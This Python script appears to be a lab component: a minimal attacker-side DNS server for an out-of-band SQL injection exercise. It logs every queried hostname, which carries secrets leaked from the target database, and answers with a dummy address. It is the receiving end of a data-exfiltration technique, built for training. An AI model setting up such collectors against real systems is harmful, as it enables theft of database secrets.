#!/usr/bin/env python3
"""Minimal attacker-controlled DNS collector for the OOB SQLi scenario.

Pure Python stdlib (no dnslib / no pip), so the image builds with no network.
It listens on UDP :53, LOGS the queried hostname of every request (this is the
exfiltration channel — the DB hides a secret inside the name it looks up), and
replies to A/AAAA queries with a dummy address so
the client's lookup succeeds and the injected payload does not hang.

Each received qname is printed to stdout AND appended to /shared/oob_dns.log
(the Kathara host-backed shared dir), so you can read captured secrets from the
host without attaching to the node:

    tail -f shared/oob_dns.log          # from the lab directory on the host
"""
import os
import socket
import struct
import sys
import time

LOG_PATH = "/shared/oob_dns.log"
LISTEN_ADDR = "0.0.0.0"
LISTEN_PORT = 53


def parse_qname(data: bytes) -> str:
    """Extract the question-section name from a DNS query packet.

    Layout: 12-byte header, then the QNAME as a sequence of length-prefixed
    labels terminated by a zero byte. No compression pointers appear in a
    question, so a straight walk is sufficient.
    """
    labels = []
    offset = 12  # skip the fixed header
    while True:
        if offset >= len(data):
            break
        length = data[offset]
        offset += 1
        if length == 0:
            break
        labels.append(data[offset:offset + length].decode("latin-1", "replace"))
        offset += length
    return ".".join(labels)


def build_response(query: bytes, qname_end: int) -> bytes:
    """Build a minimal A-record answer (127.0.0.1) echoing the question."""
    txn_id = query[:2]
    flags = b"\x81\x80"              # standard query response, no error
    counts = struct.pack(">HHHH", 1, 1, 0, 0)  # QD=1, AN=1, NS=0, AR=0
    question = query[12:qname_end + 5]          # qname + QTYPE(2) + QCLASS(2)
    answer = (
        b"\xc0\x0c"                 # pointer to the name at offset 12
        + b"\x00\x01"               # TYPE A
        + b"\x00\x01"               # CLASS IN
        + b"\x00\x00\x00\x3c"       # TTL 60
        + b"\x00\x04"               # RDLENGTH 4
        + bytes((127, 0, 0, 1))      # RDATA 127.0.0.1
    )
    return txn_id + flags + counts + question + answer


def qname_end_offset(data: bytes) -> int:
    """Return the offset of the zero byte that terminates the QNAME."""
    offset = 12
    while offset < len(data) and data[offset] != 0:
        offset += 1 + data[offset]
    return offset  # points at the terminating 0x00


def log_line(line: str) -> None:
    print(line, flush=True)
    try:
        with open(LOG_PATH, "a") as fh:
            fh.write(line + "\n")
    except OSError as exc:  # shared dir missing/unwritable: stdout still has it
        print(f"[oobsvc] WARN could not write {LOG_PATH}: {exc}", flush=True)


def main() -> int:
    os.makedirs("/shared", exist_ok=True)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_ADDR, LISTEN_PORT))
    log_line(f"[oobsvc] DNS collector listening on {LISTEN_ADDR}:{LISTEN_PORT}")
    while True:
        try:
            data, addr = sock.recvfrom(4096)
        except OSError as exc:
            print(f"[oobsvc] recv error: {exc}", file=sys.stderr, flush=True)
            continue
        if len(data) < 13:
            continue
        qname = parse_qname(data)
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        log_line(f"{ts}  from {addr[0]:<15}  qname={qname}")
        try:
            end = qname_end_offset(data)
            sock.sendto(build_response(data, end), addr)
        except (struct.error, IndexError) as exc:
            print(f"[oobsvc] reply error: {exc}", file=sys.stderr, flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
